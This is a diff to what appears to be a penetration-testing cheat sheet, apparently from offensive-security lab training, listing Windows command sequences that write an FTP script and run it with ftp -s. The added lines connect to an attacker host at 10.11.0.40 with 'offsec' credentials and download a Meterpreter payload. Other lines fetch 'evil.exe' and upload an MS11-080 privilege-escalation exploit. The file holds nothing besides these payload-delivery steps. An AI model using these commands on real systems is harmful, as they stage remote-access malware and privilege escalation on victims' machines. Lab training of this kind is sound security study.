@@ -9,7 +9,15 @@ echo bin >> ftp.txt
 echo GET evil.exe >> ftp.txt
 echo bye >> ftp.txt
 ftp -s:ftp.txt
-
+-----------
+echo open 10.11.0.40> ftp.txt
+echo offsec>> ftp.txt
+echo offsec>> ftp.txt
+echo ftp>> ftp.txt
+echo bin>> ftp.txt
+echo GET meterpreter_x86_443.exe>> ftp.txt
+echo bye>> ftp.txt
+ftp -s:ftp.txt
 #######################################
 #########################################
 put to ftp
@@ -22,3 +30,4 @@ echo bin >> ftp.txt
 echo PUT ms11-080-xp-2003-32-64.exe >> ftp.txt
 echo bye >> ftp.txt
 ftp -s:ftp.txt
+
